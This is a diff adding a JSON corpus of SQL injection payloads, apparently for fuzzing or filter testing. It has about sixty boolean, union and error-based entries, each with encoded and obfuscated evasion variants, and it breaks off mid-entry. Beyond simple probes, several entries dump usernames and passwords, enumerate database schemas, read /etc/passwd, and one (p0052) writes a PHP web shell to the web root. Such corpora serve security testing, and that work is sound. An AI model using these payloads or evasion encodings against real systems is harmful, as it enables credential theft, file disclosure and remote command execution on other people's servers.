@@ -1,0 +1,2602 @@
+[
+  {
+    "payload_id": "p0000",
+    "base_payload": "' OR '1'='1",
+    "attack_type": "boolean",
+    "variants": [
+      "'/**/OR/**/'1'='1",
+      "' or '1'='1",
+      "' OR '1'='1%00",
+      "%27%20%4f%52%20%27%31%27%3d%27%31",
+      "JyBPUiAnMSc9JzE="
+    ],
+    "example_param": "q"
+  },
+  {
+    "payload_id": "p0001",
+    "base_payload": "' OR '1'='1' --",
+    "attack_type": "boolean",
+    "variants": [
+      "' OR '1'='1' --%00",
+      "'\tOR\t'1'='1'\t--",
+      "'+OR+'1'='1'+--",
+      "'/**/OR/**/'1'='1'/**/--",
+      "%2527%2520OR%2520%25271%2527%253D%25271%2527%2520--"
+    ],
+    "example_param": "user"
+  },
+  {
+    "payload_id": "p0002",
+    "base_payload": "' OR '1'='1' /*",
+    "attack_type": "boolean",
+    "variants": [
+      "'\tOR\t'1'='1'\t/*",
+      "'\nOR\n'1'='1'\n/*",
+      "' Or '1'='1' /*",
+      "JyBPUiAnMSc9JzEnIC8q",
+      "' OR '1'='1' /*%00"
+    ],
+    "example_param": "search"
+  },
+  {
+    "payload_id": "p0003",
+    "base_payload": "' OR 1=1--",
+    "attack_type": "boolean",
+    "variants": [
+      "'+OR+1=1--",
+      "JyBPUiAxPTEtLQ==",
+      "'%20OR%201=1--",
+      "%27%20OR%201%3D1--",
+      "'/**/OR/**/1=1--"
+    ],
+    "example_param": "user"
+  },
+  {
+    "payload_id": "p0004",
+    "base_payload": "' OR 1=1#",
+    "attack_type": "boolean",
+    "variants": [
+      "'\nOR\n1=1#",
+      "%27%20OR%201%3D1%23",
+      "' OR 1=1#",
+      "%27%20%4f%52%20%31%3d%31%23",
+      "%2527%2520OR%25201%253D1%2523"
+    ],
+    "example_param": "username"
+  },
+  {
+    "payload_id": "p0005",
+    "base_payload": "' OR 1=1/*",
+    "attack_type": "boolean",
+    "variants": [
+      "'%20OR%201=1/*",
+      "'/**/OR/**/1=1/*",
+      "%2527%2520OR%25201%253D1/%252A",
+      "%27%20%4f%52%20%31%3d%31%2f%2a",
+      "'\nOR\n1=1/*"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0006",
+    "base_payload": "admin' OR '1'='1",
+    "attack_type": "boolean",
+    "variants": [
+      "YWRtaW4nIE9SICcxJz0nMQ==",
+      "admin'%20OR%20'1'='1",
+      "admin%27%20OR%20%271%27%3D%271",
+      "%61%64%6d%69%6e%27%20%4f%52%20%27%31%27%3d%27%31",
+      "admin'/**/OR/**/'1'='1"
+    ],
+    "example_param": "search"
+  },
+  {
+    "payload_id": "p0007",
+    "base_payload": "admin' OR '1'='1'--",
+    "attack_type": "boolean",
+    "variants": [
+      "%61%64%6d%69%6e%27%20%4f%52%20%27%31%27%3d%27%31%27%2d%2d",
+      "YWRtaW4nIE9SICcxJz0nMSctLQ==",
+      "admin%27%20OR%20%271%27%3D%271%27--",
+      "admin'\nOR\n'1'='1'--",
+      "admin'\tOR\t'1'='1'--"
+    ],
+    "example_param": "user"
+  },
+  {
+    "payload_id": "p0008",
+    "base_payload": "admin' OR '1'='1'#",
+    "attack_type": "boolean",
+    "variants": [
+      "admin'/**/OR/**/'1'='1'#",
+      "admin'\nOR\n'1'='1'#",
+      "admin%2527%2520OR%2520%25271%2527%253D%25271%2527%2523",
+      "admin'%20OR%20'1'='1'#",
+      "YWRtaW4nIE9SICcxJz0nMScj"
+    ],
+    "example_param": "q"
+  },
+  {
+    "payload_id": "p0009",
+    "base_payload": "' OR 'x'='x",
+    "attack_type": "boolean",
+    "variants": [
+      "%2527%2520OR%2520%2527x%2527%253D%2527x",
+      "' OR 'x'='x%00",
+      "'\tOR\t'x'='x",
+      "JyBPUiAneCc9J3g=",
+      "'%20OR%20'x'='x"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0010",
+    "base_payload": "' OR 'something'='something",
+    "attack_type": "boolean",
+    "variants": [
+      "%2527%2520OR%2520%2527something%2527%253D%2527something",
+      "%27%20OR%20%27something%27%3D%27something",
+      "'+OR+'something'='something",
+      "' or 'SOMEthIng'='SOMeThing",
+      "' OR 'something'='something%00"
+    ],
+    "example_param": "q"
+  },
+  {
+    "payload_id": "p0011",
+    "base_payload": "1' OR '1'='1",
+    "attack_type": "boolean",
+    "variants": [
+      "1'+OR+'1'='1",
+      "1'/**/OR/**/'1'='1",
+      "%31%27%20%4f%52%20%27%31%27%3d%27%31",
+      "1%2527%2520OR%2520%25271%2527%253D%25271",
+      "MScgT1IgJzEnPScx"
+    ],
+    "example_param": "username"
+  },
+  {
+    "payload_id": "p0012",
+    "base_payload": "1' OR 1=1",
+    "attack_type": "boolean",
+    "variants": [
+      "1' OR 1=1%00",
+      "1%2527%2520OR%25201%253D1",
+      "1' OR 1=1",
+      "1'\tOR\t1=1",
+      "1%27%20OR%201%3D1"
+    ],
+    "example_param": "q"
+  },
+  {
+    "payload_id": "p0013",
+    "base_payload": "1' OR 1=1--",
+    "attack_type": "boolean",
+    "variants": [
+      "1%2527%2520OR%25201%253D1--",
+      "1'%20OR%201=1--",
+      "1'\tOR\t1=1--",
+      "1' or 1=1--",
+      "1' OR 1=1--%00"
+    ],
+    "example_param": "user"
+  },
+  {
+    "payload_id": "p0014",
+    "base_payload": "1' OR 1=1#",
+    "attack_type": "boolean",
+    "variants": [
+      "1' OR 1=1#",
+      "%31%27%20%4f%52%20%31%3d%31%23",
+      "1' OR 1=1#%00",
+      "1%2527%2520OR%25201%253D1%2523",
+      "1'%20OR%201=1#"
+    ],
+    "example_param": "username"
+  },
+  {
+    "payload_id": "p0015",
+    "base_payload": "' OR ''='",
+    "attack_type": "boolean",
+    "variants": [
+      "' OR ''='%00",
+      "%2527%2520OR%2520%2527%2527%253D%2527",
+      "'/**/OR/**/''='",
+      "%27%20%4f%52%20%27%27%3d%27",
+      "' or ''='"
+    ],
+    "example_param": "search"
+  },
+  {
+    "payload_id": "p0016",
+    "base_payload": "' OR 1--",
+    "attack_type": "boolean",
+    "variants": [
+      "%27%20%4f%52%20%31%2d%2d",
+      "%2527%2520OR%25201--",
+      "' OR 1--%00",
+      "JyBPUiAxLS0=",
+      "'\tOR\t1--"
+    ],
+    "example_param": "search"
+  },
+  {
+    "payload_id": "p0017",
+    "base_payload": "' OR 1#",
+    "attack_type": "boolean",
+    "variants": [
+      "'\nOR\n1#",
+      "' oR 1#",
+      "'+OR+1#",
+      "'%20OR%201#",
+      "' OR 1#%00"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0018",
+    "base_payload": "1' AND '1'='1",
+    "attack_type": "boolean",
+    "variants": [
+      "1'\nAND\n'1'='1",
+      "1%2527%2520AND%2520%25271%2527%253D%25271",
+      "1'%20AND%20'1'='1",
+      "1'\tAND\t'1'='1",
+      "1'+AND+'1'='1"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0019",
+    "base_payload": "1 AND 1=1",
+    "attack_type": "boolean",
+    "variants": [
+      "1\tAND\t1=1",
+      "1%20AND%201=1",
+      "1 and 1=1",
+      "1 AND 1=1%00",
+      "1+AND+1=1"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0020",
+    "base_payload": "1' AND 1=1--",
+    "attack_type": "boolean",
+    "variants": [
+      "1%27%20AND%201%3D1--",
+      "1' AND 1=1--%00",
+      "1'%20AND%201=1--",
+      "MScgQU5EIDE9MS0t",
+      "%31%27%20%41%4e%44%20%31%3d%31%2d%2d"
+    ],
+    "example_param": "user"
+  },
+  {
+    "payload_id": "p0021",
+    "base_payload": ") OR ('1'='1",
+    "attack_type": "boolean",
+    "variants": [
+      "%29%20OR%20%28%271%27%3D%271",
+      ") or ('1'='1",
+      "KSBPUiAoJzEnPScx",
+      ")\tOR\t('1'='1",
+      ")+OR+('1'='1"
+    ],
+    "example_param": "username"
+  },
+  {
+    "payload_id": "p0022",
+    "base_payload": ") OR (1=1",
+    "attack_type": "boolean",
+    "variants": [
+      "%29%20OR%20%281%3D1",
+      "%2529%2520OR%2520%25281%253D1",
+      ") OR (1=1%00",
+      ")/**/OR/**/(1=1",
+      ")\nOR\n(1=1"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0023",
+    "base_payload": "')) OR (('1'='1",
+    "attack_type": "boolean",
+    "variants": [
+      "%27%29%29%20OR%20%28%28%271%27%3D%271",
+      "')) OR (('1'='1%00",
+      "'))/**/OR/**/(('1'='1",
+      "'))\nOR\n(('1'='1",
+      "JykpIE9SICgoJzEnPScx"
+    ],
+    "example_param": "search"
+  },
+  {
+    "payload_id": "p0024",
+    "base_payload": "')) OR ((1=1",
+    "attack_type": "boolean",
+    "variants": [
+      "%27%29%29%20OR%20%28%281%3D1",
+      "'))%20OR%20((1=1",
+      "'))+OR+((1=1",
+      "JykpIE9SICgoMT0x",
+      "')) or ((1=1"
+    ],
+    "example_param": "search"
+  },
+  {
+    "payload_id": "p0025",
+    "base_payload": "' OR 'a'='a",
+    "attack_type": "boolean",
+    "variants": [
+      "'+OR+'a'='a",
+      "'\tOR\t'a'='a",
+      "%2527%2520OR%2520%2527a%2527%253D%2527a",
+      "%27%20OR%20%27a%27%3D%27a",
+      "'\nOR\n'a'='a"
+    ],
+    "example_param": "username"
+  },
+  {
+    "payload_id": "p0026",
+    "base_payload": "' OR a=a--",
+    "attack_type": "boolean",
+    "variants": [
+      "%27%20OR%20a%3Da--",
+      "'%20OR%20a=a--",
+      "%2527%2520OR%2520a%253Da--",
+      "'\nOR\na=a--",
+      "' OR a=a--%00"
+    ],
+    "example_param": "username"
+  },
+  {
+    "payload_id": "p0027",
+    "base_payload": "1 OR 1=1",
+    "attack_type": "boolean",
+    "variants": [
+      "%31%20%4f%52%20%31%3d%31",
+      "1+OR+1=1",
+      "1 OR 1=1%00",
+      "1 Or 1=1",
+      "1%20OR%201=1"
+    ],
+    "example_param": "user"
+  },
+  {
+    "payload_id": "p0028",
+    "base_payload": "admin' --",
+    "attack_type": "boolean",
+    "variants": [
+      "admin' --%00",
+      "admin%27%20--",
+      "admin%2527%2520--",
+      "admin'/**/--",
+      "admin'\n--"
+    ],
+    "example_param": "username"
+  },
+  {
+    "payload_id": "p0029",
+    "base_payload": "admin' #",
+    "attack_type": "boolean",
+    "variants": [
+      "admin%2527%2520%2523",
+      "admin'\n#",
+      "admin'+#",
+      "YWRtaW4nICM=",
+      "admin'/**/#"
+    ],
+    "example_param": "user"
+  },
+  {
+    "payload_id": "p0030",
+    "base_payload": "admin'/*",
+    "attack_type": "boolean",
+    "variants": [
+      "admin'/*",
+      "admin'/*",
+      "admin'/*",
+      "admin'/*",
+      "adMiN'/*"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0031",
+    "base_payload": "' OR '1'='1' AND ''='",
+    "attack_type": "boolean",
+    "variants": [
+      "%27%20OR%20%271%27%3D%271%27%20AND%20%27%27%3D%27",
+      "'+OR+'1'='1'+AND+''='",
+      "%27%20%4f%52%20%27%31%27%3d%27%31%27%20%41%4e%44%20%27%27%3d%27",
+      "%2527%2520OR%2520%25271%2527%253D%25271%2527%2520AND%2520%2527%2527%253D%2527",
+      "'\nOR\n'1'='1'\nAND\n''='"
+    ],
+    "example_param": "search"
+  },
+  {
+    "payload_id": "p0032",
+    "base_payload": "' OR 1=1 AND ''='",
+    "attack_type": "boolean",
+    "variants": [
+      "'/**/OR/**/1=1/**/AND/**/''='",
+      "'\tOR\t1=1\tAND\t''='",
+      "%27%20OR%201%3D1%20AND%20%27%27%3D%27",
+      "'%20OR%201=1%20AND%20''='",
+      "%2527%2520OR%25201%253D1%2520AND%2520%2527%2527%253D%2527"
+    ],
+    "example_param": "search"
+  },
+  {
+    "payload_id": "p0033",
+    "base_payload": "1' OR '1'='1' LIMIT 1--",
+    "attack_type": "boolean",
+    "variants": [
+      "%31%27%20%4f%52%20%27%31%27%3d%27%31%27%20%4c%49%4d%49%54%20%31%2d%2d",
+      "1%2527%2520OR%2520%25271%2527%253D%25271%2527%2520LIMIT%25201--",
+      "1'%20OR%20'1'='1'%20LIMIT%201--",
+      "1'\nOR\n'1'='1'\nLIMIT\n1--",
+      "1%27%20OR%20%271%27%3D%271%27%20LIMIT%201--"
+    ],
+    "example_param": "q"
+  },
+  {
+    "payload_id": "p0034",
+    "base_payload": "1 OR 1=1 LIMIT 1",
+    "attack_type": "boolean",
+    "variants": [
+      "1%20OR%201%3D1%20LIMIT%201",
+      "1\nOR\n1=1\nLIMIT\n1",
+      "1 or 1=1 lIMit 1",
+      "1\tOR\t1=1\tLIMIT\t1",
+      "%31%20%4f%52%20%31%3d%31%20%4c%49%4d%49%54%20%31"
+    ],
+    "example_param": "q"
+  },
+  {
+    "payload_id": "p0035",
+    "base_payload": "' UNION SELECT NULL--",
+    "attack_type": "union",
+    "variants": [
+      "JyBVTklPTiBTRUxFQ1QgTlVMTC0t",
+      "'\nUNION\nSELECT\nNULL--",
+      "%27%20UNION%20SELECT%20NULL--",
+      "%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%4e%55%4c%4c%2d%2d",
+      "'%20UNION%20SELECT%20NULL--"
+    ],
+    "example_param": "product_id"
+  },
+  {
+    "payload_id": "p0036",
+    "base_payload": "' UNION SELECT NULL,NULL--",
+    "attack_type": "union",
+    "variants": [
+      "'/**/UNION/**/SELECT/**/NULL,NULL--",
+      "%27%20UNION%20SELECT%20NULL%2CNULL--",
+      "%2527%2520UNION%2520SELECT%2520NULL%252CNULL--",
+      "'\tUNION\tSELECT\tNULL,NULL--",
+      "'\nUNION\nSELECT\nNULL,NULL--"
+    ],
+    "example_param": "product_id"
+  },
+  {
+    "payload_id": "p0037",
+    "base_payload": "' UNION SELECT NULL,NULL,NULL--",
+    "attack_type": "union",
+    "variants": [
+      "'/**/UNION/**/SELECT/**/NULL,NULL,NULL--",
+      "' unioN SelECT nuLL,NuLl,nuLL--",
+      "'\tUNION\tSELECT\tNULL,NULL,NULL--",
+      "%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2d%2d",
+      "' UNION SELECT NULL,NULL,NULL--%00"
+    ],
+    "example_param": "item"
+  },
+  {
+    "payload_id": "p0038",
+    "base_payload": "' UNION SELECT 1,2,3--",
+    "attack_type": "union",
+    "variants": [
+      "'\nUNION\nSELECT\n1,2,3--",
+      "'+UNION+SELECT+1,2,3--",
+      "' unIon sELECT 1,2,3--",
+      "'\tUNION\tSELECT\t1,2,3--",
+      "%27%20UNION%20SELECT%201%2C2%2C3--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0039",
+    "base_payload": "' UNION SELECT 'a','b','c'--",
+    "attack_type": "union",
+    "variants": [
+      "' UNION SELECT 'a','b','c'--%00",
+      "'\tUNION\tSELECT\t'a','b','c'--",
+      "'+UNION+SELECT+'a','b','c'--",
+      "%2527%2520UNION%2520SELECT%2520%2527a%2527%252C%2527b%2527%252C%2527c%2527--",
+      "'/**/UNION/**/SELECT/**/'a','b','c'--"
+    ],
+    "example_param": "product_id"
+  },
+  {
+    "payload_id": "p0040",
+    "base_payload": "' UNION ALL SELECT NULL--",
+    "attack_type": "union",
+    "variants": [
+      "' UNION ALL SELECT NULL--%00",
+      "JyBVTklPTiBBTEwgU0VMRUNUIE5VTEwtLQ==",
+      "'+UNION+ALL+SELECT+NULL--",
+      "%2527%2520UNION%2520ALL%2520SELECT%2520NULL--",
+      "'\tUNION\tALL\tSELECT\tNULL--"
+    ],
+    "example_param": "item"
+  },
+  {
+    "payload_id": "p0041",
+    "base_payload": "' UNION ALL SELECT NULL,NULL--",
+    "attack_type": "union",
+    "variants": [
+      "%27%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%4e%55%4c%4c%2c%4e%55%4c%4c%2d%2d",
+      "%27%20UNION%20ALL%20SELECT%20NULL%2CNULL--",
+      "'+UNION+ALL+SELECT+NULL,NULL--",
+      "JyBVTklPTiBBTEwgU0VMRUNUIE5VTEwsTlVMTC0t",
+      "'\tUNION\tALL\tSELECT\tNULL,NULL--"
+    ],
+    "example_param": "item"
+  },
+  {
+    "payload_id": "p0042",
+    "base_payload": "1' UNION SELECT NULL,NULL,NULL--",
+    "attack_type": "union",
+    "variants": [
+      "1%2527%2520UNION%2520SELECT%2520NULL%252CNULL%252CNULL--",
+      "1'\nUNION\nSELECT\nNULL,NULL,NULL--",
+      "%31%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2d%2d",
+      "1' UNION SELECT NULL,NULL,NULL--%00",
+      "1'+UNION+SELECT+NULL,NULL,NULL--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0043",
+    "base_payload": "-1 UNION SELECT NULL,NULL,NULL--",
+    "attack_type": "union",
+    "variants": [
+      "-1\tUNION\tSELECT\tNULL,NULL,NULL--",
+      "-1+UNION+SELECT+NULL,NULL,NULL--",
+      "-1/**/UNION/**/SELECT/**/NULL,NULL,NULL--",
+      "-1%20UNION%20SELECT%20NULL,NULL,NULL--",
+      "%2d%31%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2d%2d"
+    ],
+    "example_param": "item"
+  },
+  {
+    "payload_id": "p0044",
+    "base_payload": "' UNION SELECT username,password FROM users--",
+    "attack_type": "union",
+    "variants": [
+      "'\tUNION\tSELECT\tusername,password\tFROM\tusers--",
+      "' unION SeLeCT uSernaMe,pASSwoRD FROm usErS--",
+      "'+UNION+SELECT+username,password+FROM+users--",
+      "%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--",
+      "%2527%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users--"
+    ],
+    "example_param": "item"
+  },
+  {
+    "payload_id": "p0045",
+    "base_payload": "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+    "attack_type": "union",
+    "variants": [
+      "' uNioN SeLEct TAblE_NaMe,NuLl FroM InFormATiON_schEma.TAblES--",
+      "'\nUNION\nSELECT\ntable_name,NULL\nFROM\ninformation_schema.tables--",
+      "'/**/UNION/**/SELECT/**/table_name,NULL/**/FROM/**/information_schema.tables--",
+      "'\tUNION\tSELECT\ttable_name,NULL\tFROM\tinformation_schema.tables--",
+      "' UNION SELECT table_name,NULL FROM information_schema.tables--%00"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0046",
+    "base_payload": "' UNION SELECT column_name,NULL FROM information_schema.columns--",
+    "attack_type": "union",
+    "variants": [
+      "%2527%2520UNION%2520SELECT%2520column_name%252CNULL%2520FROM%2520information_schema.columns--",
+      "%27%20UNION%20SELECT%20column_name%2CNULL%20FROM%20information_schema.columns--",
+      "'\tUNION\tSELECT\tcolumn_name,NULL\tFROM\tinformation_schema.columns--",
+      "'\nUNION\nSELECT\ncolumn_name,NULL\nFROM\ninformation_schema.columns--",
+      "'/**/UNION/**/SELECT/**/column_name,NULL/**/FROM/**/information_schema.columns--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0047",
+    "base_payload": "1' UNION SELECT @@version,NULL,NULL--",
+    "attack_type": "union",
+    "variants": [
+      "1' uNION SELECT @@verSioN,nUlL,nuLL--",
+      "MScgVU5JT04gU0VMRUNUIEBAdmVyc2lvbixOVUxMLE5VTEwtLQ==",
+      "%31%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%40%40%76%65%72%73%69%6f%6e%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2d%2d",
+      "1' UNION SELECT @@version,NULL,NULL--%00",
+      "1'\nUNION\nSELECT\n@@version,NULL,NULL--"
+    ],
+    "example_param": "page"
+  },
+  {
+    "payload_id": "p0048",
+    "base_payload": "1' UNION SELECT database(),user(),version()--",
+    "attack_type": "union",
+    "variants": [
+      "1'\nUNION\nSELECT\ndatabase(),user(),version()--",
+      "1%2527%2520UNION%2520SELECT%2520database%2528%2529%252Cuser%2528%2529%252Cversion%2528%2529--",
+      "%31%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%64%61%74%61%62%61%73%65%28%29%2c%75%73%65%72%28%29%2c%76%65%72%73%69%6f%6e%28%29%2d%2d",
+      "1'+UNION+SELECT+database(),user(),version()--",
+      "1' UNION SELECT database(),user(),version()--%00"
+    ],
+    "example_param": "page"
+  },
+  {
+    "payload_id": "p0049",
+    "base_payload": "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",
+    "attack_type": "union",
+    "variants": [
+      "'\nUNION\nSELECT\n1,2,group_concat(table_name)\nFROM\ninformation_schema.tables--",
+      "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--%00",
+      "'\tUNION\tSELECT\t1,2,group_concat(table_name)\tFROM\tinformation_schema.tables--",
+      "%27%20UNION%20SELECT%201%2C2%2Cgroup_concat%28table_name%29%20FROM%20information_schema.tables--",
+      "%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%32%2c%67%72%6f%75%70%5f%63%6f%6e%63%61%74%28%74%61%62%6c%65%5f%6e%61%6d%65%29%20%46%52%4f%4d%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%2e%74%61%62%6c%65%73%2d%2d"
+    ],
+    "example_param": "item"
+  },
+  {
+    "payload_id": "p0050",
+    "base_payload": "' UNION SELECT NULL,NULL,load_file('/etc/passwd')--",
+    "attack_type": "union",
+    "variants": [
+      "' Union SelEct NULl,Null,loaD_fIlE('/EtC/PasswD')--",
+      "'+UNION+SELECT+NULL,NULL,load_file('/etc/passwd')--",
+      "JyBVTklPTiBTRUxFQ1QgTlVMTCxOVUxMLGxvYWRfZmlsZSgnL2V0Yy9wYXNzd2QnKS0t",
+      "%27%20UNION%20SELECT%20NULL%2CNULL%2Cload_file%28%27/etc/passwd%27%29--",
+      "'\tUNION\tSELECT\tNULL,NULL,load_file('/etc/passwd')--"
+    ],
+    "example_param": "item"
+  },
+  {
+    "payload_id": "p0051",
+    "base_payload": "' UNION SELECT * FROM (SELECT NULL,NULL,NULL)a--",
+    "attack_type": "union",
+    "variants": [
+      "JyBVTklPTiBTRUxFQ1QgKiBGUk9NIChTRUxFQ1QgTlVMTCxOVUxMLE5VTEwpYS0t",
+      "'\nUNION\nSELECT\n*\nFROM\n(SELECT\nNULL,NULL,NULL)a--",
+      "'\tUNION\tSELECT\t*\tFROM\t(SELECT\tNULL,NULL,NULL)a--",
+      "%2527%2520UNION%2520SELECT%2520%252A%2520FROM%2520%2528SELECT%2520NULL%252CNULL%252CNULL%2529a--",
+      "'/**/UNION/**/SELECT/**/*/**/FROM/**/(SELECT/**/NULL,NULL,NULL)a--"
+    ],
+    "example_param": "item"
+  },
+  {
+    "payload_id": "p0052",
+    "base_payload": "' UNION SELECT 1,'<?php system($_GET[\"cmd\"]); ?>',3 INTO OUTFILE '/var/www/shell.php'--",
+    "attack_type": "union",
+    "variants": [
+      "' UNION SeLEcT 1,'<?phP sysTEM($_GEt[\"CMd\"]); ?>',3 into OutfiLE '/Var/wWw/shelL.pHp'--",
+      "'\tUNION\tSELECT\t1,'<?php\tsystem($_GET[\"cmd\"]);\t?>',3\tINTO\tOUTFILE\t'/var/www/shell.php'--",
+      "'/**/UNION/**/SELECT/**/1,'<?php/**/system($_GET[\"cmd\"]);/**/?>',3/**/INTO/**/OUTFILE/**/'/var/www/shell.php'--",
+      "'%20UNION%20SELECT%201,'<?php%20system($_GET[\"cmd\"]);%20?>',3%20INTO%20OUTFILE%20'/var/www/shell.php'--",
+      "%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%27%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%24%5f%47%45%54%5b%22%63%6d%64%22%5d%29%3b%20%3f%3e%27%2c%33%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%73%68%65%6c%6c%2e%70%68%70%27%2d%2d"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0053",
+    "base_payload": "999' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
+    "attack_type": "union",
+    "variants": [
+      "999'/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,9,10--",
+      "999' UNION SELECT 1,2,3,4,5,6,7,8,9,10--%00",
+      "999'%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10--",
+      "999%27%20UNION%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10--",
+      "999'\nUNION\nSELECT\n1,2,3,4,5,6,7,8,9,10--"
+    ],
+    "example_param": "product_id"
+  },
+  {
+    "payload_id": "p0054",
+    "base_payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=2--",
+    "attack_type": "union",
+    "variants": [
+      "%2527%2520UNION%2520SELECT%2520NULL%252CNULL%252CNULL%2520WHERE%25201%253D2--",
+      "'%20UNION%20SELECT%20NULL,NULL,NULL%20WHERE%201=2--",
+      "'\nUNION\nSELECT\nNULL,NULL,NULL\nWHERE\n1=2--",
+      "' union SElecT NULl,NuLL,nULl wHeRE 1=2--",
+      "'+UNION+SELECT+NULL,NULL,NULL+WHERE+1=2--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0055",
+    "base_payload": "' AND 1=CONVERT(int,@@version)--",
+    "attack_type": "error",
+    "variants": [
+      "'\nAND\n1=CONVERT(int,@@version)--",
+      "'+AND+1=CONVERT(int,@@version)--",
+      "'/**/AND/**/1=CONVERT(int,@@version)--",
+      "JyBBTkQgMT1DT05WRVJUKGludCxAQHZlcnNpb24pLS0=",
+      "%27%20%41%4e%44%20%31%3d%43%4f%4e%56%45%52%54%28%69%6e%74%2c%40%40%76%65%72%73%69%6f%6e%29%2d%2d"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0056",
+    "base_payload": "' AND 1=CAST(@@version AS int)--",
+    "attack_type": "error",
+    "variants": [
+      "%2527%2520AND%25201%253DCAST%2528%2540%2540version%2520AS%2520int%2529--",
+      "' ANd 1=cAST(@@vErSION as INT)--",
+      "'+AND+1=CAST(@@version+AS+int)--",
+      "%27%20%41%4e%44%20%31%3d%43%41%53%54%28%40%40%76%65%72%73%69%6f%6e%20%41%53%20%69%6e%74%29%2d%2d",
+      "'\tAND\t1=CAST(@@version\tAS\tint)--"
+    ],
+    "example_param": "filter"
+  },
+  {
+    "payload_id": "p0057",
+    "base_payload": "' AND extractvalue(1,concat(0x7e,version()))--",
+    "attack_type": "error",
+    "variants": [
+      "%2527%2520AND%2520extractvalue%25281%252Cconcat%25280x7e%252Cversion%2528%2529%2529%2529--",
+      "'/**/AND/**/extractvalue(1,concat(0x7e,version()))--",
+      "%27%20AND%20extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--",
+      "'+AND+extractvalue(1,concat(0x7e,version()))--",
+      "' anD EXTrACtVAlUe(1,COnCAT(0X7E,versiOn()))--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0058",
+    "base_payload": "' AND updatexml(1,concat(0x7e,database()),1)--",
+    "attack_type": "error",
+    "variants": [
+      "'\nAND\nupdatexml(1,concat(0x7e,database()),1)--",
+      "JyBBTkQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSksMSktLQ==",
+      "'%20AND%20updatexml(1,concat(0x7e,database()),1)--",
+      "'+AND+updatexml(1,concat(0x7e,database()),1)--",
+      "'/**/AND/**/updatexml(1,concat(0x7e,database()),1)--"
+    ],
+    "example_param": "filter"
+  },
+  {
+    "payload_id": "p0059",
+    "base_payload": "' AND exp(~(SELECT * FROM (SELECT 1)a))--",
+    "attack_type": "error",
+    "variants": [
+      "' AND exp(~(SELECT * FROM (SELECT 1)a))--%00",
+      "'\tAND\texp(~(SELECT\t*\tFROM\t(SELECT\t1)a))--",
+      "%27%20AND%20exp%28~%28SELECT%20%2A%20FROM%20%28SELECT%201%29a%29%29--",
+      "JyBBTkQgZXhwKH4oU0VMRUNUICogRlJPTSAoU0VMRUNUIDEpYSkpLS0=",
+      "%27%20%41%4e%44%20%65%78%70%28%7e%28%53%45%4c%45%43%54%20%2a%20%46%52%4f%4d%20%28%53%45%4c%45%43%54%20%31%29%61%29%29%2d%2d"
+    ],
+    "example_param": "filter"
+  },
+  {
+    "payload_id": "p0060",
+    "base_payload": "' OR 1=1 AND row(1,1)>(SELECT COUNT(*),CONCAT(CHAR(58),CHAR(58),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x LIMIT 1)--",
+    "attack_type": "error",
+    "variants": [
+      "' or 1=1 aNd ROW(1,1)>(sElEct cOUnt(*),cOncAT(CHar(58),chAr(58),floOR(raND(0)*2))x FROM INfoRMATion_sChEMa.pLugins GrOuP bY X lIMit 1)--",
+      "'\nOR\n1=1\nAND\nrow(1,1)>(SELECT\nCOUNT(*),CONCAT(CHAR(58),CHAR(58),FLOOR(RAND(0)*2))x\nFROM\nINFORMATION_SCHEMA.PLUGINS\nGROUP\nBY\nx\nLIMIT\n1)--",
